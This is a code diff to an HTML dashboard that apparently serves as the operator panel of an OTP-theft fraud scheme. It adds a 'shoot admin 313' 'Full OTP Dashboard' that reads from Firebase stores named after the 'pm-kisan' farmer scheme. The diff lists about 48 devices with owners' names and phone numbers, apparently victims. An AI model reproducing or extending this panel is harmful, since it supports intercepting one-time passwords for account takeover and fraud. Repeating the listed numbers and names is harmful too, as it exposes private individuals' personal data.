@@ -1,4 +1,4 @@
-=<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -762,7 +762,7 @@
             { name: "Anclucis's S25 Ultra", sim1: "8415098076", sim2: null }
         ];
 
-        // ========== DEVICE DATA FOR SHOOT ADMIN 228 (as provided) ==========
+        // ========== DEVICE DATA FOR SHOOT ADMIN 228 ==========
         const devices228Raw = [
             { name: "OnePlus Nord CE4 Lite 5G", sim1: "8000935102", sim2: "9602079727" },
             { name: "TECNO SPARK 10C", sim1: "917020843173", sim2: null },
@@ -883,6 +883,58 @@
             { name: "realme C33 2023", sim1: "918418276650", sim2: null }
         ];
 
+        // ========== DEVICE DATA FOR SHOOT ADMIN 313 ==========
+        const devices313Raw = [
+            { name: "Unknown Device 1", sim1: "917740029361", sim2: "917888735241" },
+            { name: "V2152", sim1: "919358724841", sim2: null },
+            { name: "V2249", sim1: "917727993785", sim2: null },
+            { name: "Jaswinder's A06", sim1: "919915701753", sim2: null },
+            { name: "Unknown Device 5", sim1: "918198850872", sim2: null },
+            { name: "V2315", sim1: "919829687951", sim2: "971547677835" },
+            { name: "Galaxy A16 5G", sim1: "919678561815", sim2: null },
+            { name: "V2238", sim1: "918875869656", sim2: "918290169656" },
+            { name: "realme C21Y", sim1: null, sim2: null },
+            { name: "RMX1911", sim1: null, sim2: null },
+            { name: "realme C53", sim1: null, sim2: "918955375302" },
+            { name: "Galaxy F23 5G", sim1: "916378783064", sim2: "917568681925" },
+            { name: "V2338", sim1: "917850020980", sim2: null },
+            { name: "Neeraj kumar", sim1: null, sim2: null },
+            { name: "CPH2179", sim1: null, sim2: null },
+            { name: "OnePlus Nord CE3 5G", sim1: null, sim2: null },
+            { name: "V2420", sim1: "7742004280", sim2: null },
+            { name: "motorola edge 60 stylus", sim1: null, sim2: "919045156445" },
+            { name: "Sonu Kumar's F15", sim1: null, sim2: null },
+            { name: "V2403", sim1: "8302153192", sim2: null },
+            { name: "realme C53", sim1: null, sim2: null },
+            { name: "V2315", sim1: "918302696073", sim2: null },
+            { name: "V2158", sim1: "919784915642", sim2: null },
+            { name: "Pardeep's A12", sim1: "919988144038", sim2: "918882345185" },
+            { name: "Galaxy A15 5G", sim1: "918218439874", sim2: null },
+            { name: "Sonu ji", sim1: "919625385732", sim2: "918796920336" },
+            { name: "V2403", sim1: null, sim2: "917023740386" },
+            { name: "Unknown Device 28", sim1: "6377763401", sim2: "919779765118" },
+            { name: "Babu Lal's A06", sim1: "919872398033", sim2: null },
+            { name: "realme 12 Pro+ 5G", sim1: null, sim2: "917505133562" },
+            { name: "Unknown Device 31", sim1: null, sim2: "919417153484" },
+            { name: "jitendra's A13", sim1: "918755794026", sim2: "919258294026" },
+            { name: "V2334", sim1: "919877398276", sim2: null },
+            { name: "Unknown Device 34", sim1: "9915446566", sim2: "919915446566" },
+            { name: "V2204", sim1: "918094179060", sim2: "919660948094" },
+            { name: "V2432", sim1: "916284836361", sim2: "917837427665" },
+            { name: "realme 6", sim1: "919166177785", sim2: "9166177785" },
+            { name: "moto g45 5G", sim1: "919630848021", sim2: null },
+            { name: "V2141", sim1: "9935431722", sim2: null },
+            { name: "LAVA LXX516", sim1: "919720615573", sim2: null },
+            { name: "realme narzo N55", sim1: null, sim2: null },
+            { name: "LAVA LXX516", sim1: "919521186013", sim2: "917976986013" },
+            { name: "V2315", sim1: "9387504561", sim2: "8011446822" },
+            { name: "V2338", sim1: "918690227262", sim2: null },
+            { name: "POCO C51", sim1: null, sim2: "918545071030" },
+            { name: "V2207", sim1: null, sim2: "7055041994" },
+            { name: "V2225", sim1: "918284096729", sim2: null },
+            { name: "Unknown Device 48", sim1: "918858066338", sim2: null }
+        ];
+
         // Clean phone numbers (remove 91 prefix, keep 10 digits)
         function cleanPhoneNumber(num) {
             if (!num || typeof num !== 'string') return null;
@@ -899,6 +951,12 @@
             sim2: cleanPhoneNumber(d.sim2)
         }));
 
+        const devices313 = devices313Raw.map(d => ({
+            name: d.name,
+            sim1: cleanPhoneNumber(d.sim1),
+            sim2: cleanPhoneNumber(d.sim2)
+        }));
+
         // ========== PANEL CONFIGURATIONS ==========
         const panelConfigs = {
             "shoot admin 1": {
@@ -910,6 +968,11 @@
                 firebaseUrl: "https://pm-kishan-23gug-default-rtdb.firebaseio.com/.json",
                 devices: devices228,
                 storagePrefix: "panel228"
+            },
+            "shoot admin 313": {
+                firebaseUrl: "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/.json",
+                devices: devices313,
+                storagePrefix: "panel313"
             }
         };
 
@@ -917,9 +980,9 @@
         const panels = [
             { name: "shoot admin 1", desc: "Full OTP Dashboard" },
             { name: "shoot admin 228", desc: "Full OTP Dashboard" },
-            { name: "shoot admin 313", url: null, desc: "Coming Soon" },
-            { name: "shoot admin 42", url: null, desc: "Coming Soon" },
-            { name: "shoot admin 205", url: null, desc: "Coming Soon" }
+            { name: "shoot admin 313", desc: "Full OTP Dashboard" },
+            { name: "shoot admin 42", desc: "Coming Soon" },
+            { name: "shoot admin 205", desc: "Coming Soon" }
         ];
 
         function renderPanels(filter = "") {
